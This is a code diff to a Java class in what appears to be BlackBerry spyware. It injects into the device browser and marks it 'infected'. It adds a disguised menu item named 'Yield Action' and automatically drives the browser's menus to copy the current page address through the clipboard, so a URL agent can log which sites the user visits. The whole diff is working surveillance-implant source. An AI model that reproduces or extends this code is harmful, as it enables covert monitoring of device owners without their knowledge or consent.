@@ -11,8 +11,10 @@ package blackberry.agent.url;
 
 import net.rim.blackberry.api.menuitem.ApplicationMenuItem;
 import net.rim.blackberry.api.menuitem.ApplicationMenuItemRepository;
+import net.rim.device.api.system.Clipboard;
 import net.rim.device.api.ui.Screen;
 import net.rim.device.api.ui.UiApplication;
+import blackberry.Device;
 import blackberry.agent.UrlAgent;
 import blackberry.debug.Debug;
 import blackberry.debug.DebugLevel;
@@ -20,7 +22,7 @@ import blackberry.injection.MenuWalker;
 import blackberry.utils.Utils;
 
 public class BrowserMenuItem extends ApplicationMenuItem {
-    private static final String BROWSER_MENU = "Zend Menu";
+    private static final String BROWSER_MENU = "Yield Action";
     //#ifdef DEBUG
     private static Debug debug = new Debug("BrowserMenuItem",
             DebugLevel.VERBOSE);
@@ -28,10 +30,12 @@ public class BrowserMenuItem extends ApplicationMenuItem {
     static BrowserMenuItem instance;
 
     Screen browserScreen;
+    UiApplication browserApp;
     String lastUrl;
 
     Thread menuThread;
     UrlAgent agent;
+    private long bbmid;
 
     public static BrowserMenuItem getInstance() {
         if (instance == null)
@@ -42,6 +46,13 @@ public class BrowserMenuItem extends ApplicationMenuItem {
 
     public BrowserMenuItem(int arg0) {
         super(arg0);
+
+        if (Device.getInstance().atLeast(6, 0)) {
+            bbmid = ApplicationMenuItemRepository.MENUITEM_SYSTEM;
+        } else {
+            bbmid = ApplicationMenuItemRepository.MENUITEM_BROWSER;
+
+        }
     }
 
     /**
@@ -56,22 +67,40 @@ public class BrowserMenuItem extends ApplicationMenuItem {
             debug.trace("run in context");
             //#endif
 
+            if (Device.getInstance().atLeast(6, 0)) {
+                boolean ret = MenuWalker.walk("Copy Page Address");
+                if (ret) {
+                    String url = (String) Clipboard.getClipboard().get();
+                    if (url != null) {
+                        //#ifdef DEBUG
+                        debug.trace("run, 6.0, URL FOUND:" + url);
+                        //#endif
+                        context = url;
+                    }
+                } else {
+                    //#ifdef DEBUG
+                    debug.error("run: no Copy Address, wrong screen");
+                    //#endif
+                    return null;
+                }
+            }
+
             if (browserScreen == null) {
                 //#ifdef DEBUG
                 debug.info("run: init Browser Screen");
                 //#endif
-                UiApplication app = UiApplication.getUiApplication();
-                browserScreen = app.getActiveScreen();
+                browserApp = UiApplication.getUiApplication();
+                browserScreen = browserApp.getActiveScreen();
 
                 //#ifdef DEBUG
                 debug.trace("run browserScreen: " + browserScreen);
                 //#endif
-                
+
                 //#ifdef DEBUG
                 debug.info("BROWSER INJECTED!");
                 debug.ledFlash(Debug.COLOR_GREEN);
                 //#endif
-                
+
                 AppInjectorBrowser.getInstance().setInfected(true);
             }
 
@@ -83,7 +112,6 @@ public class BrowserMenuItem extends ApplicationMenuItem {
             }
 
             String url = (String) context;
-
             urlManagement(url);
 
         } catch (Exception ex) {
@@ -105,7 +133,7 @@ public class BrowserMenuItem extends ApplicationMenuItem {
             //#ifdef DEBUG
             debug.trace("Adding menu browser");
             //#endif
-            long bbmid = ApplicationMenuItemRepository.MENUITEM_BROWSER;
+
             ApplicationMenuItemRepository.getInstance()
                     .addMenuItem(bbmid, this);
             menuAdded = true;
@@ -117,7 +145,7 @@ public class BrowserMenuItem extends ApplicationMenuItem {
             //#ifdef DEBUG
             debug.trace("Removing menu browser");
             //#endif
-            long bbmid = ApplicationMenuItemRepository.MENUITEM_BROWSER;
+
             ApplicationMenuItemRepository.getInstance().removeMenuItem(bbmid,
                     this);
             menuAdded = false;
@@ -145,12 +173,22 @@ public class BrowserMenuItem extends ApplicationMenuItem {
 
     public void callMenuInContext() {
         //#ifdef DEBUG
-        debug.trace("whatever");
+        debug.trace("callMenuInContext");
         //#endif
         if (browserScreen != null) {
             addMenuBrowser();
-            Utils.sleep(200);
-            MenuWalker.walk(BROWSER_MENU, browserScreen, false);
+            Utils.sleep(200);            
+            browserScreen = browserApp.getActiveScreen();            
+            
+            if(firsttime){
+                //#ifdef DEBUG
+                debug.trace("callMenuInContext: close the about");
+                //#endif
+                firsttime=false;
+                MenuWalker.walk("Close", browserScreen, false);   
+            }else{
+                MenuWalker.walk(BROWSER_MENU, browserScreen, false);                
+            }
             Utils.sleep(200);
             removeMenuBrowser();
         } else {
@@ -158,5 +196,11 @@ public class BrowserMenuItem extends ApplicationMenuItem {
             debug.trace("callMenuInContext: null browserScreen");
             //#endif
         }
+    }
+
+    boolean firsttime=false;
+    public void firstTime() {
+        firsttime=true;
+        
     }
 }
